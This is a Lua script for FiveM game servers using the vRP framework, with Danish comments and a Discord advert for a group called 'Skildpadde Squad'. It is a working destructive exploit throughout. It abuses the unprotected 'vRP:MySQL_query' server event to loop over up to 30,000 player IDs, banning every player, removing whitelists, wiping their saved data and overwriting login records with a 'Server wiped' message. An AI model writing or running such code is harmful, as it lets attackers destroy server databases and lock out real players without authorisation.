TriggerDatabaseEvent = function(server, event, ...)
    local request = msgpack.pack({...})
    if server then
        TriggerServerEventInternal(event, request, request:len())
    else
        TriggerEventInternal(event, request, request:len())
    end
end

local function ClearConsole()
    for clear = 1,200 do
        print("")
    end
end

local function Velkommen()
    print("")
    print("")
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-")
    print("")
    print("")
    print("[INFO] VELKOMMEN!")
    print("[INFO] VERSION: 1.0 ")
    print("[INFO] STARTER OM 5 SEKUNDER, ")
    print("")
    print("")
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-")
    print("")
    print("")
end


Citizen.CreateThread(function()
    ClearConsole()
    Velkommen()
    Citizen.Wait(5500)
    for i = 0,30000 do -- ændre dette 30000 til antal ids der er på serveren
        Wait(100)
        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_last_login", {user_id = i, last_login = "Skildpadde Squad | Server wiped | discord.gg/skildpaddesquad"}, 2) -- fjerner last login og replacer det med discord link (kan folk se i databasen)
        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/banned", {user_id = i, banned = 1, reason = "Skildpadde Squad | Server wiped | discord.gg/skildpaddesquad"}, 2) -- banner person
        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_whitelisted", {user_id = i, whitelisted = 0}, 2) -- fjern whitelist af person
        TriggerDatabaseEvent(true, "vRP:MySQL_query", "vRP/set_userdata", {user_id = i, key = "vRP:datatable", value = "{}"}, 2) -- wiper en persons data da den sætter det til 0 data, du kan sætte den til hvad du vil men kun i json.
        print('[SKILDPADDE SQUAD - LOGGING] ID ' .. i .. ' Done!')
    end
end)
